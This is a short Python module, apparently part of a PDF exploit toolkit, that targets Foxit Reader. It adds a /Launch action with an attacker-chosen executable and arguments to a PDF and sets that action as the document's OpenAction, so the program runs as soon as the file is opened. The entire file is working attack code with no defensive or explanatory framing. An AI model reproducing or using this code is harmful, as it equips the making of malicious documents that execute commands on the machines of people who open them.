from core.imp import *
from core import Pdf


class Foxit():
    def __init__(self, exec: str, args: str) -> None:
        self._exec = exec
        if args:
            self._args = args
        else:
            self._args = ""

    def _make_action(self) -> DictionaryObject:
        return DictionaryObject({
            NameObject("/S"): NameObject("/Launch"),
            NameObject("/Win"): DictionaryObject({
                NameObject("/F"): TextStringObject(self._exec),
                NameObject("/P"): TextStringObject(self._args),
            }),
        })

    def exploit(self, pdf: Pdf):
        action = self._make_action()
        for o in pdf.objects:
            try:
                t = cast(NameObject, o["/Type"])
                if t == "/Catalog":
                    o[NameObject("/OpenAction")] = pdf.add_object(action)
                    print("set OpenAction to Catalog done")
                    break
            except (KeyError, TypeError):
                pass
